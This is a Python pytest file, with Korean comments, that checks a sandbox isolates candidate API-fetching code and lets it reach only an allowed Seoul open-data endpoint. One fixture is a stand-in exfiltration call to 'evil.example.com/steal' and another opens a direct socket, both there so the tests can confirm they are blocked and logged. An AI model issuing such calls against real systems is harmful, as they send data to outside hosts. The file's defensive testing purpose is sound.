"""Zone S 경계 검사 (AC-10, AC-15).

여기서 하나라도 실패하면 후보 코드를 실행할 자격이 없다.
"""

from __future__ import annotations

import json
import tempfile
from pathlib import Path

import pytest

from api_doctor.sandbox.base import BoundaryCase, SandboxLimits
from api_doctor.sandbox.container import ContainerBackend
from api_doctor.sandbox.openshell import OpenShellBackend
from api_doctor.sandbox.selftest import RuntimeUnavailable, select_backend

from _docker import requires_docker

LIMITS = SandboxLimits()

# 서울 공공도서관 응답 형태를 모사한 2페이지 동결 스냅샷.
SNAPSHOT = {
    1: {"SeoulLibraryInfo": {"list_total_count": 3, "row": [
        {"LBRRY_SEQ_NO": "1", "LBRRY_NAME": "가"},
        {"LBRRY_SEQ_NO": "2", "LBRRY_NAME": "나"}]}},
    2: {"SeoulLibraryInfo": {"list_total_count": 3, "row": [
        {"LBRRY_SEQ_NO": "3", "LBRRY_NAME": "다"}]}},
}
ALLOWED_PREFIX = "https://openapi.seoul.go.kr:8088/"


def broker(url: str, params: dict) -> dict:
    """Zone T broker 스텁. 허용 endpoint 의 동결 응답만 반환한다."""
    if not url.startswith(ALLOWED_PREFIX):
        return {"denied": True, "reason": f"허용되지 않은 endpoint: {url}"}
    page = int(params.get("page", 1))
    body = SNAPSHOT.get(page, {"SeoulLibraryInfo": {"list_total_count": 3, "row": []}})
    return {"status": 200, "headers": {}, "body": json.dumps(body, ensure_ascii=False)}


def run(code: str):
    with tempfile.TemporaryDirectory() as tmp:
        path = Path(tmp) / "candidate.py"
        path.write_text(code, encoding="utf-8")
        return ContainerBackend().run_candidate(path, {"scope_id": "all"}, broker, LIMITS)


GOOD = """
def fetch_records(http, query):
    out, page = [], 1
    while True:
        r = http.get("https://openapi.seoul.go.kr:8088/data", params={"page": page})
        rows = r.json()["SeoulLibraryInfo"]["row"]
        if not rows:
            break
        out.extend(rows)
        page += 1
    return out
"""

# 대표 복합 결함: 중첩 경로 오독 + 페이지 종료 조건 없음 (PRD §3.1)
BROKEN = """
def fetch_records(http, query):
    r = http.get("https://openapi.seoul.go.kr:8088/data", params={"page": 1})
    return r.json().get("row", [])
"""

DIRECT_SOCKET = """
import urllib.request
def fetch_records(http, query):
    urllib.request.urlopen("http://example.com", timeout=3)
    return []
"""

FORBIDDEN_ENDPOINT = """
def fetch_records(http, query):
    return http.get("http://evil.example.com/steal", params={}).json()
"""


@requires_docker
def test_all_boundary_cases_blocked() -> None:
    report = ContainerBackend().boundary_selftest(LIMITS)
    assert report.available, report.unavailable_reason
    assert {r.case for r in report.results} == set(BoundaryCase)
    assert report.passed, f"경계 누수: {[(r.case, r.detail) for r in report.failures]}"


@requires_docker
def test_healthy_candidate_collects_all_pages() -> None:
    outcome = run(GOOD)
    assert outcome.ok, outcome.error
    assert len(outcome.records or []) == 3
    assert outcome.requests_made == 3
    assert outcome.denials == []


@requires_docker
def test_composite_defect_loses_records() -> None:
    """복합 결함 후보는 실행은 되지만 데이터를 잃는다 — 이것이 대표 데모 사례다."""
    outcome = run(BROKEN)
    assert outcome.exit_code == 0, "실행 자체는 성공해야 한다"
    assert outcome.records == [], "중첩 경로 오독으로 0건이 된다"


@requires_docker
def test_direct_socket_is_blocked_and_recorded() -> None:
    """AC-15: 차단될 뿐 아니라 차단 기록이 남아야 한다."""
    outcome = run(DIRECT_SOCKET)
    assert not outcome.ok
    assert outcome.denials, "차단 기록을 수집하지 못하면 차단 성공을 주장할 수 없다"
    assert len(outcome.denials) == 1, f"시도 1회는 기록 1건: {outcome.denials}"
    denial = outcome.denials[0]
    assert denial.backend_id == ContainerBackend().backend_id
    assert denial.reason and denial.occurred_at


@requires_docker
def test_forbidden_endpoint_denied_by_broker() -> None:
    outcome = run(FORBIDDEN_ENDPOINT)
    assert not outcome.ok
    assert any("허용되지 않은 endpoint" in d.reason for d in outcome.denials)


@requires_docker
def test_denials_never_claim_openshell() -> None:
    """컨테이너 결과를 OpenShell 증거로 표시하지 않는다 (AC-15)."""
    for denial in run(DIRECT_SOCKET).denials:
        assert denial.backend_id != "openshell"


def test_openshell_reports_unavailable_rather_than_falling_back() -> None:
    """가용하지 않으면 예외가 아니라 사유를 담은 리포트를 반환한다.

    preflight 가 "왜 OpenShell 을 못 쓰는지"를 보고할 수 있어야 하기 때문이다.
    어느 경우에도 passed 가 참이 되지는 않는다.
    """
    backend = OpenShellBackend()
    available, reason = backend.availability()
    if available:
        pytest.skip("OpenShell 가용 환경 — 별도 경계 시연 대상")
    assert reason, "가용하지 않으면 사유를 남겨야 한다"
    report = backend.boundary_selftest(LIMITS)
    assert report.available is False
    assert report.passed is False, "가용하지 않은 backend 로 후보를 실행할 수 없다"
    assert report.unavailable_reason == reason


def test_unavailable_openshell_does_not_block_container_selection() -> None:
    """OpenShell 부재가 곧 RUNTIME_UNAVAILABLE 은 아니다 — 컨테이너로 내려간다."""
    report = OpenShellBackend().boundary_selftest(LIMITS)
    assert not report.passed


@requires_docker
def test_select_backend_returns_only_verified_backend() -> None:
    selection = select_backend(LIMITS)
    assert selection.report.passed
    assert selection.backend.backend_id in {"openshell", "container"}


def test_runtime_unavailable_is_an_error_not_a_host_fallback() -> None:
    """검증된 backend 가 없으면 호스트에서 대신 실행하지 않고 실패한다."""
    assert issubclass(RuntimeUnavailable, RuntimeError)
